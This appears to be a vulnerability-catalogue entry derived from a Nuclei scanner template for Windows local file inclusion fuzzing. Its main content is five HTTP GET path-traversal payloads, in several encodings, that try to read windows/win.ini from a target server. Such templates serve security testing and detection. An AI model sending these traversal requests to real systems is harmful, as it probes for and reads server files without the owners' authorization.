# Vulnerability: Windows - Local File Inclusion Fuzzing
**Classification:** FUZZ
**Source:** Nuclei Template (`windows-lfi-fuzzing.yaml`)

## Description
Fuzzing for /windows/win.ini.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini
GET {{BaseURL}}/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/windows/win.ini
GET {{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini
GET {{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
GET {{BaseURL}}/../../../../../../windows/win.ini
```

